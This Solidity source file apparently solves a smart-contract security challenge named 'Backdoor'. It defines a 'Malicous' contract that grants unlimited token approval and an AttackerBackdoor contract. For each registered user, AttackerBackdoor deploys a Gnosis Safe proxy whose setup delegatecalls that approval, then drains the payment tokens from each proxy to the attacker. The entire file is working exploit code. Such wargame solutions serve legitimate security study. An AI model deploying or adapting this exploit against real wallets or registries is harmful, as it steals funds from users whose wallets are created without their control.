//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "../backdoor/WalletRegistry.sol";

interface IGnosisSafeProxyFactory{
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}


contract Malicous{
    function approve(address attacker, IERC20 token) public{
        token.approve(attacker,type(uint256).max);
    }
}

contract AttackerBackdoor{
    WalletRegistry immutable wallet;
    uint256 private constant PAYMENT_AMOUNT = 10 ether;
    address immutable owner;
    address[]  users;
    Malicous private  Ms;

    constructor (address _wallet, address[] memory _users){
        wallet = WalletRegistry(_wallet);
        users = _users;
        owner = msg.sender;    
        Ms = new Malicous();
        
        address[] memory _owners = new address[](1);
        bytes memory initializer; 
        for(uint256 i; i < users.length;){
            _owners[0] = users[i];
            initializer =  abi.encodeWithSelector(GnosisSafe.setup.selector,
                _owners,
                1,
                address(Ms),
                abi.encodeWithSelector(Ms.approve.selector, address(this), wallet.token()),
                address(0),
                address(0),
                0,
                address(0)
            );
            GnosisSafeProxy proxy = IGnosisSafeProxyFactory(wallet.walletFactory()).createProxyWithCallback(
                wallet.masterCopy(),
                initializer,
                0,
                wallet
            );
            wallet.token().transferFrom(address(proxy),owner,PAYMENT_AMOUNT);
            unchecked{
                ++i;
            }
        }

    }
}